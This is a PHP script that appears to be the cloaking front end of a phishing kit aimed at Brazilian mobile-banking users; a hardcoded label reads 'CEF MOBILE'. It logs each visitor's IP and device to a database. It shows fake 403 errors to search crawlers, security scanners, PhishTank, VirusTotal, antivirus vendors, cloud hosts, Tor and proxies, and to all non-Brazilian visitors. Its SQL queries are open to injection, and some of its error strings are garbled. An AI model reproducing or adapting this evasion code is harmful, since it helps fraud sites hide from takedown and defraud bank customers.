<?php
session_start();
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
header("Access-Control-Allow-Origin: *");
require_once 'function.php';
require_once '../../db.php';
require_once '../../libraries/device_detector/autoload.php';
require_once '../../libraries/mobile_detect/autoload.php';
require_once '../../libraries/crawler_detect/autoload.php';

use DeviceDetector\DeviceDetector;
use DeviceDetector\Parser\Device\AbstractDeviceParser;
use Jaybizzle\CrawlerDetect\CrawlerDetect;

AbstractDeviceParser::setVersionTruncation(AbstractDeviceParser::VERSION_TRUNCATION_NONE);

/***********************************Banco************************************************/
$db = new db();
$db = $db->connect();
/***********************************Banco************************************************/
/***********************************Configurações************************************************/
$ip =  getIp();
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$datetime = date('d-m-Y H:i:s');
$dd = new DeviceDetector($userAgent);
$dd->parse();
$browser = $dd->getClient('name');
$osInfo = $dd->getOs('name');
$device = $dd->getDeviceName();
$brand = $dd->getBrandName();
$model = $dd->getModel();
$sistema = $osInfo . ' - ' . $device . ' - ' . $brand . ' - ' . $model;
/***********************************Configurações************************************************/

if (isset($_SESSION['COUNTRY_CODE']) || isset($_SESSION['HOST']) || isset($_SESSION['PROXY']) || isset($_SESSION['TOR'])) {
} else {
    $getisp = getIsp($ip);
}

$sql = "select count(id) as contagem, max(acessos) + 1 as contagem_acesso from acessos where ip = '$ip'";
$result = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);

if ($result[0]['contagem'] > 0) {
    $acesso = $result[0]['contagem_acesso'];
    $update = "update acessos set acessos = '$acesso' where ip = '$ip'";
    $exec = $db->query($update);
} else {
    $insert = "insert into acessos values 
            (
                '$datetime', 
                '$ip', 
                '" . $_SESSION['COUNTRY_CODE'] . "', 
                '', 
                '', 
                '$sistema', 
                '$browser', 
                '', 
                '" . $_SESSION['HOST'] . "', 
                '', 
                '', 
                '1', 
                'CEF MOBILE',
                '$ip')";
    $exec_insert = $db->query($insert);
}

/***********************************BlackList************************************************/
/*
$ips = array($ip,);
$checklist = new IpBlockList();
foreach ($ips as $ip) {
    $result = $checklist->ipPass($ip);
    if (!$result) {
        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbisssdden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
    }
}
*/
/***********************************BlackList************************************************/

/***********************************DeviceDetector********************************************/
if ($dd->isBot()) {
    $botInfo = $dd->getBot();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbisssdden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
/***********************************DeviceDetector********************************************/
/***********************************CrawlerDetect********************************************/
$CrawlerDetect = new CrawlerDetect;
if ($CrawlerDetect->isCrawler() == true && $_SESSION['COUNTRY_CODE'] !== 'BR') {
    $update = "update acessos set status = 'Bloqueio CrawlerDetect', hostname = 'Bloqueio CrawlerDetect' where ip = '$ip'";
    $exec = $db->query($update);
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}

// Pass a user agent as a string
if ($CrawlerDetect->isCrawler('Mozilla/5.0 (compatible; Sosospider/2.0; +http://help.soso.com/webspider.htm)') == false) {
    $update = "update acessos set status = 'Bloqueio CrawlerDetect', hostname = 'Bloqueio CrawlerDetect' where ip = '$ip'";
    $exec = $db->query($update);
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
/***********************************CrawlerDetect********************************************/
/***********************************User Agent********************************************/
if (
    $userAgent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" ||
    $userAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)"
) {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}

if ($userAgent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
/***********************************User Agent********************************************/

/***********************************Strtolower********************************************/
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);

$blocked_words = array(
    "bot",
    "above",
    "google",
    "docomo",
    "mediapartners",
    "phantomjs",
    "lighthouse",
    "reverseshorturl",
    "samsung-sgh-e250",
    "softlayer",
    "amazonaws",
    "cyveillance",
    "crawler",
    "gsa-crawler",
    "phishtank",
    "dreamhost",
    "netpilot",
    "calyxinstitute",
    "tor-exit",
    "apache-httpclient",
    "lssrocketcrawler",
    "crawler",
    "urlredirectresolver",
    "jetbrains",
    "spam",
    "windows 95",
    "windows 98",
    "acunetix",
    "netsparker",
    "007ac9",
    "008",
    "Feedfetcher",
    "192.comagent",
    "200pleasebot",
    "360spider",
    "4seohuntbot",
    "50.nu",
    "a6-indexer",
    "admantx",
    "amznkassocbot",
    "aboundexbot",
    "aboutusbot",
    "abrave spider",
    "accelobot",
    "acoonbot",
    "addthis.com",
    "adsbot-google",
    "ahrefsbot",
    "alexabot",
    "amagit.com",
    "analytics",
    "antbot",
    "apercite",
    "aportworm",
    "EBAY",
    "CL0NA",
    "jabber",
    "ebay",
    "arabot",
    "hotmail!",
    "msn!",
    "baidu",
    "outlook!",
    "outlook",
    "msn",
    "duckduckbot",
    "hotmail",
    "go-http-client",
    "go-http-client/1.1",
    "trident",
    "presto",
    "virustotal",
    "unchaos",
    "dreampassport",
    "sygol",
    "nutch",
    "privoxy",
    "zipcommander",
    "neofonie",
    "abacho",
    "acoi",
    "acoon",
    "adaxas",
    "agada",
    "aladin",
    "alkaline",
    "amibot",
    "anonymizer",
    "aplix",
    "aspseek",
    "avant",
    "baboom",
    "anzwers",
    "anzwerscrawl",
    "crawlconvera",
    "del.icio.us",
    "camehttps",
    "annotate",
    "wapproxy",
    "translate",
    "feedfetcher",
    "ask24",
    "asked",
    "askaboutoil",
    "fangcrawl",
    "amzn_assoc",
    "bingpreview",
    "dr.web",
    "drweb",
    "bilbo",
    "blackwidow",
    "sogou",
    "sogou-test-spider",
    "exabot",
    "externalhit",
    "ia_archiver",
    "googletranslate",
    "translate",
    "proxy",
    "dalvik",
    "quicklook",
    "seamonkey",
    "sylera",
    "safebrowsing",
    "safesurfingwidget",
    "preview",
    "whatsapp",
    "telegram",
    "instagram",
    "zteopen",
    "icoreservice",
    "untrusted"

);

foreach ($blocked_words as $word2) {
    if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {
        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
    }
}

/***********************************Strtolower********************************************/

/***********************************Hostname********************************************/
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$blocked_words = array(
    "teledata-fttx.de",
    "hicoria.com",
    "simtccflow1.etn.com",
    "above",
    "google",
    "softlayer",
    "amazonaws",
    "cyveillance",
    "phishtank",
    "dreamhost",
    "netpilot",
    "calyxinstitute",
    "tor-exit",
    "msnbot",
    "p3pwgdsn",
    "netcraft",
    "trendmicro",
    "ebay",
    "paypal",
    "torservers",
    "messagelabs",
    "sucuri.net",
    "crawler",
    "duckduck",
    "feedfetcher",
    "BitDefender",
    "mcafee",
    "antivirus",
    "cloudflare",
    "p3pwgdsn",
    "avg",
    "avira",
    "avast",
    "ovh.net",
    "security",
    "twitter",
    "bitdefender",
    "virustotal",
    "phising",
    "clamav",
    "baidu",
    "safebrowsing",
    "eset",
    "mailshell",
    "azure",
    "miniature",
    "tlh.ro",
    "aruba",
    "dyn.plus.net",
    "pagepeeker",
    "SPRO-NET-207-70-0",
    "SPRO-NET-209-19-128",
    "vultr",
    "colocrossing.com",
    "geosr",
    "drweb",
    "dr.web",
    "linode.com",
    "opendns",
    'cymru.com',
    'sl-reverse.com',
    'surriel.com',
    'hosting',
    'orange-labs',
    'speedtravel',
    'metauri',
    'apple.com',
    'bruuk.sk',
    'sysms.net',
    'oracle',
    'cisco',
    'amuri.net',
    "versanet.de",
    "hilfe-veripayed.com",
    "googlebot.com",
    "upcloud.host",
    "nodemeter.net",
    "e-active.nl",
    "downnotifier",
    "online-domain-tools",
    "fetcher6-2.go.mail.ru",
    "uptimerobot.com",
    "monitis.com",
    "colocrossing.com",
    "majestic12",
    "as9105.com",
    "btcentralplus.com",
    "anonymizing-proxy",
    "digitalcourage.de",
    "triolan.net",
    "staircaseirony",
    "stelkom.net",
    "comrise.ru",
    "kyivstar.net",
    "mpdedicated.com",
    "starnet.md",
    "progtech.ru",
    "hinet.net",
    "is74.ru",
    "shore.net",
    "cyberinfo",
    "ipredator",
    "unknown.telecom.gomel.by",
    "minsktelecom.by",
    "parked.factioninc.com",
    "avast",
    "prcdn.net"
);

foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {

        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
    }
}
/***********************************Hostname********************************************/

/***********************************Bot********************************************/
$Bot = array(
    "abot",
    "dbot",
    "ebot",
    "hbot",
    "kbot",
    "lbot",
    "mbot",
    "nbot",
    "obot",
    "pbot",
    "rbot",
    "sbot",
    "tbot",
    "vbot",
    "ybot",
    "zbot",
    "bot.",
    "bot/",
    "_bot",
    ".bot",
    "/bot",
    "-bot",
    ":bot",
    "(bot",
    "crawl",
    "slurp",
    "spider",
    "seek",
    "avg",
    "avira",
    "bitdefender",
    "kaspersky",
    "sophos",
    "virustotal",
    "virus",
    "accoona",
    "acoon",
    "adressendeutschland",
    "ah-ha.com",
    "ahoy",
    "altavista",
    "ananzi",
    "anthill",
    "appie",
    "arachnophilia",
    "arale",
    "araneo",
    "aranha",
    "architext",
    "aretha",
    "arks",
    "asterias",
    "atlocal",
    "atn",
    "atomz",
    "augurfind",
    "backrub",
    "bannana_bot",
    "baypup",
    "bdfetch",
    "big brother",
    "biglotron",
    "bjaaland",
    "blackwidow",
    "blaiz",
    "blog",
    "blo.",
    "bloodhound",
    "boitho",
    "booch",
    "bradley",
    "butterfly",
    "calif",
    "cassandra",
    "ccubee",
    "cfetch",
    "charlotte",
    "churl",
    "cienciaficcion",
    "cmc",
    "collective",
    "comagent",
    "combine",
    "computingsite",
    "csci",
    "curl",
    "cusco",
    "daumoa",
    "deepindex",
    "delorie",
    "depspid",
    "deweb",
    "die blinde kuh",
    "digger",
    "ditto",
    "dmoz",
    "docomo",
    "download express",
    "dtaagent",
    "dwcp",
    "ebiness",
    "ebingbong",
    "e-collector",
    "ejupiter",
    "emacs-w3 search engine",
    "esther",
    "evliya celebi",
    "ezresult",
    "falcon",
    "felix ide",
    "ferret",
    "fetchrover",
    "fido",
    "findlinks",
    "fireball",
    "fish search",
    "fouineur",
    "funnelweb",
    "gazz",
    "gcreep",
    "genieknows",
    "getterroboplus",
    "geturl",
    "glx",
    "goforit",
    "golem",
    "grabber",
    "grapnel",
    "gralon",
    "griffon",
    "gromit",
    "grub",
    "gulliver",
    "hamahakki",
    "harvest",
    "havindex",
    "helix",
    "heritrix",
    "hku www octopus",
    "homerweb",
    "htdig",
    "html index",
    "html_analyzer",
    "htmlgobble",
    "hubater",
    "hyper-decontextualizer",
    "ia_archiver",
    "ibm_planetwide",
    "ichiro",
    "iconsurf",
    "iltrovatore",
    "image.kapsi.net",
    "imagelock",
    "incywincy",
    "indexer",
    "infobee",
    "informant",
    "ingrid",
    "inktomisearch.com",
    "inspector web",
    "intelliagent",
    "internet shinchakubin",
    "ip3000",
    "iron33",
    "israeli-search",
    "ivia",
    "jack",
    "jakarta",
    "javabee",
    "jetbot",
    "jumpstation",
    "katipo",
    "kdd-explorer",
    "kilroy",
    "knowledge",
    "kototoi",
    "kretrieve",
    "labelgrabber",
    "lachesis",
    "larbin",
    "legs",
    "libwww",
    "linkalarm",
    "link validator",
    "linkscan",
    "lockon",
    "lwp",
    "lycos",
    "magpie",
    "mantraagent",
    "mapoftheinternet",
    "marvin/",
    "mattie",
    "mediafox",
    "mediapartners",
    "mercator",
    "merzscope",
    "microsoft url control",
    "minirank",
    "miva",
    "mj12",
    "mnogosearch",
    "moget",
    "monster",
    "moose",
    "motor",
    "multitext",
    "muncher",
    "muscatferret",
    "mwd.search",
    "myweb",
    "najdi",
    "nameprotect",
    "nationaldirectory",
    "nazilla",
    "ncsa beta",
    "nec-meshexplorer",
    "nederland.zoek",
    "netcarta webmap engine",
    "netmechanic",
    "netresearchserver",
    "netscoop",
    "newscan-online",
    "nhse",
    "nokia6682/",
    "nomad",
    "noyona",
    "siteexplorer",
    "nutch",
    "nzexplorer",
    "objectssearch",
    "occam",
    "omni",
    "open text",
    "openfind",
    "openintelligencedata",
    "orb search",
    "osis-project",
    "pack rat",
    "pageboy",
    "pagebull",
    "page_verifier",
    "panscient",
    "parasite",
    "partnersite",
    "patric",
    "pear.",
    "pegasus",
    "peregrinator",
    "pgp key agent",
    "phantom",
    "phpdig",
    "picosearch",
    "piltdownman",
    "pimptrain",
    "pinpoint",
    "pioneer",
    "piranha",
    "plumtreewebaccessor",
    "pogodak",
    "poirot",
    "pompos",
    "poppelsdorf",
    "poppi",
    "popular iconoclast",
    "psycheclone",
    "publisher",
    "python",
    "rambler",
    "raven search",
    "roach",
    "road runner",
    "roadhouse",
    "robbie",
    "robofox",
    "robozilla",
    "rules",
    "salty",
    "sbider",
    "scooter",
    "scoutjet",
    "scrubby",
    "search.",
    "searchprocess",
    "semanticdiscovery",
    "senrigan",
    "sg-scout",
    "shai'hulud",
    "shark",
    "shopwiki",
    "sidewinder",
    "sift",
    "silk",
    "simmany",
    "site searcher",
    "site valet",
    "sitetech-rover",
    "skymob.com",
    "sleek",
    "smartwit",
    "sna-",
    "snappy",
    "snooper",
    "sohu",
    "speedfind",
    "sphere",
    "sphider",
    "spinner",
    "spyder",
    "steeler/",
    "suke",
    "suntek",
    "supersnooper",
    "surfnomore",
    "sven",
    "sygol",
    "szukacz",
    "tach black widow",
    "tarantula",
    "templeton",
    "/teoma",
    "t-h-u-n-d-e-r-s-t-o-n-e",
    "theophrastus",
    "titan",
    "titin",
    "tkwww",
    "toutatis",
    "t-rex",
    "tutorgig",
    "twiceler",
    "twisted",
    "ucsd",
    "udmsearch",
    "url check",
    "updated",
    "vagabondo",
    "valkyrie",
    "verticrawl",
    "victoria",
    "vision-search",
    "volcano",
    "voyager/",
    "voyager-hc",
    "w3c_validator",
    "w3m2",
    "w3mir",
    "walker",
    "wallpaper",
    "wanderer",
    "wauuu",
    "wavefire",
    "web core",
    "web hopper",
    "web wombat",
    "webbandit",
    "webcatcher",
    "webcopy",
    "webfoot",
    "weblayers",
    "weblinker",
    "weblog monitor",
    "webmirror",
    "webmonkey",
    "webquest",
    "webreaper",
    "websitepulse",
    "websnarf",
    "webstolperer",
    "webvac",
    "webwalk",
    "webwatch",
    "webwombat",
    "webzinger",
    "wget",
    "whizbang",
    "whowhere",
    "wild ferret",
    "worldlight",
    "wwwc",
    "wwwster",
    "xenu",
    "xget",
    "xift",
    "xirq",
    "yandex",
    "yanga",
    "yeti",
    "yodao",
    "zao/",
    "zippp",
    "zyborg",
    "proximic",
    "Googlebot",
    "Baiduspider",
    "Cliqzbot",
    "A6-Indexer",
    "AhrefsBot",
    "Genieo",
    "BomboraBot",
    "CCBot",
    "URLAppendBot",
    "DomainAppender",
    "msnbot-media",
    "Antivirus",
    "YoudaoBot",
    "MJ12bot",
    "linkdexbot",
    "Go-http-client",
    "presto",
    "BingPreview",
    "go-http-client",
    "go-http-client/1.1",
    "trident",
    "presto",
    "virustotal",
    "unchaos",
    "dreampassport",
    "sygol",
    "nutch",
    "privoxy",
    "zipcommander",
    "neofonie",
    "abacho",
    "acoi",
    "acoon",
    "adaxas",
    "agada",
    "aladin",
    "alkaline",
    "amibot",
    "anonymizer",
    "aplix",
    "aspseek",
    "avant",
    "baboom",
    "anzwers",
    "anzwerscrawl",
    "crawlconvera",
    "del.icio.us",
    "camehttps",
    "annotate",
    "wapproxy",
    "translate",
    "feedfetcher",
    "ask24",
    "asked",
    "askaboutoil",
    "fangcrawl",
    "amzn_assoc",
    "bingpreview",
    "dr.web",
    "drweb",
    "bilbo",
    "blackwidow",
    "sogou",
    "sogou-test-spider",
    "exabot",
    "externalhit",
    "ia_archiver",
    "mj12",
    "okhttp",
    "simplepie",
    "curl",
    "wget",
    "virus",
    "pipes",
    "antivirus",
    "python",
    "ruby",
    "avast",
    "firebird",
    "scmguard",
    "adsbot",
    "weblight",
    "favicon",
    "analytics",
    "insights",
    "headless",
    "github",
    "node",
    "agusescan",
    "zteopen",
    "majestic12",
    "SimplePie",
    "SAMSUNG-SGH-E250",
    "DoCoMo/2.0 N905i",
    "SiteLockSpider",
    "okhttp/2.5.0",
    "ips-agent",
    "scoutjet",
    "UptimeRobot",
    "FM Scene",
    "Prevx",
    "WindowsPowerShell"
);

foreach ($Bot as $BotType) {
    if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
    }
}
/***********************************Bot********************************************/

/***********************************Block Isp********************************************/
$ispnya = $_SESSION['HOST'];

$banned_isp = array(
    'MICROSOFT',
    'AMAZON-02',
    'GOOGLE',
    'ORACLE-BMC-31898',
    'OOO Network of data-centers Selectel',
    'China Telecom Next Generation Carrier Network',
    'Peak 10',
    'Quasi Networks LTD',
    'SC Rusnano',
    'GoDaddy.com, LLC',
    'Server Plan S.r.l.',
    'LINODE',
    'Blazing SEO',
    'Lixux OU',
    'Inter Connects Inc',
    'Flokinet Ltd',
    'LukMAN Multimedia Sp. z o.o',
    'PIPEX-BLOCK1',
    'IPVanish',
    'LinkGrid LLC',
    'Snab-Inform Private Enterprise',
    'Cisco Systems',
    'Network and Information Technology Limited',
    'London Wires Ltd.',
    'Tehnologii Budushego LLC',
    'Eonix Corporation',
    'hosttech GmbH',
    'Wowrack.com',
    'SunGard Availability Services LP',
    'Internap Network Services Corporation',
    'Palo Alto Networks',
    'PlusNet Technologies Ltd',
    'Scaleway',
    'Facebook',
    'Host1Plus',
    'XO Communications',
    'Nobis Technology Group',
    'ExpressVPN',
    'DME Hosting LLC',
    'Prescient Software',
    'Sungard Network Solutions',
    'OVH SAS',
    'Iomart Hosting Ltd',
    'Hosting Solution',
    'Barracuda Networks',
    'Sungard Network Solutions',
    'Solar VPS',
    'PHPNET Hosting Services',
    'DigitalOcean',
    'Level 3 Communications',
    'softlayer',
    'Chelyabinsk-Signal LLC',
    'SoftLayer Technologies',
    'Complete Internet Access',
    'london-tor.mooo.com',
    'amazonaws',
    'cyveillance',
    'phishtank',
    'tor.piratenpartei-nrw.de',
    'cpanel66.proisp.no',
    'tor-node.com',
    'dreamhost',
    'Involta',
    'exit0.liskov.tor-relays.net',
    'tor.tocici.com',
    'netpilot',
    'calyxinstitute',
    'tor-exit',
    'msnbot',
    'p3pwgdsn',
    'netcraft',
    'University of Virginia',
    'trendmicro',
    'ebay',
    'paypal',
    'torservers',
    'comodo',
    'EGIHosting',
    'ebbs.healingpathsolutions.com',
    'healingpathsolutions.com',
    'Solution Pro',
    'Zayo Bandwidth',
    'spider.clicktargetdevelopment.com',
    'clicktargetdevelopment.com',
    'static.spro.net',
    'Digital Ocean',
    'Internap Network Services Corporation',
    'Blue Coat Systems',
    'GANDI SAS',
    'roamsite.com',
    'PIPEX-BLOCK1',
    'ColoUp',
    'Westnet',
    'The University of Tokyo',
    'University',
    'University of',
    'QuadraNet',
    'exit-01a.noisetor.net',
    'noisetor.net',
    'noisetor',
    'vultr.com',
    'Zscaler',
    'Choopa',
    'RedSwitches Pty',
    'Quintex Alliance Consulting',
    'www16.mailshell.com',
    'this.is.a.tor.exit-node.net',
    'this.is.a.tor.node.xmission.com',
    'colocrossing.com',
    'DedFiberCo',
    'crawl',
    'sucuri.net',
    'crawler',
    'proxy',
    'enom',
    'cloudflare',
    'yahoo',
    'trustwave',
    'rima-tde.net',
    'tfbnw.net',
    'pacbell.net',
    'tpnet.pl',
    'ovh.net',
    'centralnic',
    'badware',
    'phishing',
    'antivirus',
    'SiteAdvisor',
    'McAfee',
    'Bitdefender',
    'avirasoft',
    'phishtank.com',
    'googleusercontent',
    'OVH SAS',
    'Yahoo',
    'Yahoo! Inc.',
    'Google',
    'Google Inc.',
    'GoDaddy',
    'Amazon Technologies Inc.',
    'Amazon',
    'Top Level Hosting SRL',
    'Twitter',
    'Microsoft',
    'Microsoft Corporation',
    'OVH',
    'VPSmalaysia.com.my',
    'Madgenius.com',
    'Barracuda Networks Inc.',
    'Barracuda',
    'SecuredConnectivity.net',
    'Digital Domain',
    'Hetzner Online',
    'Akamai',
    'SoftLayer',
    'SURFnet',
    'Creative Thought Inc.',
    'Fastly',
    'Return Path Inc.',
    'WhatsApp',
    'Instagram',
    'Schulte Consulting LLC',
    'Universidade Federal do Rio de Janeiro',
    'Sectoor',
    'Bitfolk',
    'DIR A/S',
    'Team Technologies LLC',
    'Mainloop',
    'Junk Email Filter Inc.',
    'Art Matrix - Lightlink Inc.',
    'Redpill Linpro AS',
    'CloudFlare',
    'ESET spol. s r.o.',
    'AVAST Software s.r.o.',
    'Dosarrest',
    'Apple Inc.',
    'Symantec',
    'Mozilla',
    'Netprotect SRL',
    'Host Europe GmbH',
    'Host Sailor Ltd.',
    'PSINet Inc.',
    'Daniel James Austin',
    'RamNode',
    'Hostalia',
    'Xs4all Internet BV',
    'Inktomi Corporation',
    'Eircom Customer Assignment',
    '9New Network Inc',
    'Sony',
    'Private IP Address LAN',
    'Computer Problem Solving',
    'Fortinet',
    'Avira',
    'Rackspace',
    'Baidu',
    'Comodo',
    'Incapsula Inc',
    'Orange Polska Spolka Akcyjna',
    'Infosphere',
    'Private Customer',
    'SurfControl',
    'University of Newcastle upon Tyne',
    'Total Server Solutions',
    'LukMAN',
    'eSecureData',
    'Hosting',
    'VI Na Host Co. Ltd',
    'B2 Net Solutions',
    'Master Internet',
    'Global Perfomance',
    'Fireeye',
    'AntiVirus',
    'Intersoft Internet',
    'Voxility',
    'Linode',
    'Internet-Pro',
    'Trustwave Holdings Inc',
    'Online SAS',
    'Versaweb',
    'Liquid Web',
    'A100 ROW',
    'Apexis AG',
    'Apexis',
    'LogicWeb',
    'Virtual1 Limited',
    'VNET a.s.',
    'Static IP Assignment',
    'TerraTransit AG',
    'Merit Network',
    'PathsConnect',
    'Long Thrive',
    'LG DACOM',
    'Secure Internet',
    'Kaspersky',
    'UK Dedicated Servers Limited',
    'Customer Network',
    'Flokinet',
    'Simpli Networks LLC',
    'Psychz',
    'PrivateSystems Networks',
    'ScanSafe Services',
    'CachedNet',
    'CloudVPN',
    'Spark New Zealand Trading Ltd',
    'Whitelabel IT Solutions Corp',
    'Hostwinds',
    'Hosteros LLC',
    'HostUS',
    'Host',
    'ClientID',
    'Server',
    'Oracle',
    'Fortinet',
    'Unus Inc.',
    'Public facing services',
    'Virtual Employee Pvt Ltd',
    'Dataline Ltd',
    'Teksavvy Solutions Inc.',
    'UPC Romania Bucuresti',
    'TalkTalk Communications Limited',
    'British Telecommunications PLC',
    'Global Data Networks LLC',
    'Quintex Alliance Consulting',
    'Online S.A.S.',
    'Content Delivery Network Ltd',
    'Nobis Technology Group LLC',
    'Parrukatu',
    'JSC ER-Telecom Holding',
    'ChinaNet Fujian Province Network',
    'QualityNetwork',
    'Vist On-Line Ltd',
    'The Calyx Institute',
    'Internet Customers',
    'OJSC Oao Tattelecom',
    'Petersburg Internet Network Ltd.',
    'Psychz Networks',
    'Udasha',
    'Onavo Mobile Ltd',
    'Cubenode System SL',
    'OVH Hosting Inc.',
    'NForce Entertainment B.V.',
    'DigitalOcean LLC',
    'Glenayre Electronics Inc.',
    'British Telecommunications PLC',
    'Iomart Hosting Limited',
    'Digital Energy Technologies Limited',
    'Private Customer',
    'Cisco Systems Inc.',
    'Vultr Holdings LLC',
    'Amazon.com Inc.',
    'Web Hosting Solutions',
    'Time Warner Cable Internet LLC',
    'Internet Security - TC',
    'Vertical Telecoms Broadband Networks and Internet Provider',
    'Ventelo Wholesale',
    'MYX Group LLC',
    'France Telecom S.A.',
    'Online S.A.S.',
    'Nine Internet Solutions AG',
    'Microsoft Azure',
    'Choopa, LLC',
    'Amazon',
    'HighWinds Network',
    'Amazon.com',
    'Bell Canada',
    'Digital Ocean',
    'M247 LTD Frankfurt Infrastructure',
    'Palo Alto Networks',
    'Spectrum',
    'ImOn Communications, LLC',
    'Wintek Corporation',
    'ServerMania',
    'Claro Dominican Republic',
    '013 NetVision',
    'Amazon.com',
    'Digital Ocean',
    'TalkTalk',
    'HostDime.com',
    'AVAST Software s.r.o.',
    'Host1Plus Cloud Servers',
    'Amazon Data Services NoVa',
    'Google Cloud',
    'M-net',
    'Digiweb ltd',
    'Prescient Software',
    'Eir Broadband',
    'Solution Pro',
    'Bell Canada',
    'Linode',
    'DigitalOcean',
    'Plusnet',
    'GigeNET',
    'ZenLayer',
    'NFOrce Entertainment B.V.',
    'NewMedia Express',
    'Telegram Messenger Network',
    'IQ PL Sp. z o.o.',
    'Datacamp Limited',
    'Tahoe Internet Exchange (TahoeIX)',
    'ITCOM Shpk',
    'HEG US',
    'Daimler AG'

);

foreach ($banned_isp as $isps) {
    if (substr_count($ispnya, $isps) > 0) {
        $update = "update acessos set status = 'Bloqueio Isp' where ip = '$ip'";
        $exec = $db->query($update);
        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
    }
}
/***********************************Block Isp********************************************/
/***********************************Bloqueio País, Vpn, Proxy, Tor********************************************/
if ($_SESSION['COUNTRY_CODE'] !== 'BR') {
    $update = "update acessos set status = 'Bloqueio País' where ip = '$ip'";
    $exec = $db->query($update);
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>XMRthis server.</p></body></html>');
    exit();
}
if ($_SESSION['PROXY'] == 'true') {
    $update = "update acessos set status = 'Bloqueio Proxy' where ip = '$ip'";
    $exec = $db->query($update);
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>XMRthis server.</p></body></html>');
    exit();
}

if ($_SESSION['TOR'] == 'true') {
    $update = "update acessos set status = 'Bloqueio Tor' where ip = '$ip'";
    $exec = $db->query($update);
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>XMRthis server.</p></body></html>');
    exit();
}
/***********************************Bloqueio País, Vpn, Proxy, Tor********************************************/

/***********************************Mobile Detect************************************************/
function dispositivo()
{
    $detect = new Mobile_Detect;
    $detect->isMobile();
    if ($detect->isMobile()) {
        return 'mobile';
        exit;
    } else {
        return 'desktop';
        exit;
    }
}
/***********************************Mobile Detect************************************************/
